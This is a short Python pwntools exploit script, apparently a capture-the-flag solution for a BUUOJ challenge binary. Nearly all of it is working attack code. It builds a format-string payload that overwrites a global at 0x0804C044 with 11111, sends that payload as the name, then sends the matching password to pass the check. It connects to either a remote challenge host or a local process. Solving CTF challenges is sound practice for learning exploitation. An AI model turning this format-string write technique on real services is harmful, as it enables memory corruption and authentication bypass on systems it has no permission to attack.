from pwn import *
import string
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary


def dbg():
	raw_input()


if args['REMOTE']:
	p = remote('node2.buuoj.cn.wetolink.com', 28080)
	#libc = ELF('../x86_libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn')
	#gdb.attach(p, 'b* 0x080492BB')
	dbg()


target_addr = 0x0804C044
offset = 9

payload = fmtstr_payload(offset = 10, writes={target_addr:11111}, numbwritten=0, write_size='byte')
p.recvuntil('your name:')
#payload = 'aaaa%9$x'
p.sendline(payload)


p.recvuntil('your passwd:')
p.send("11111")

p.interactive()
p.close()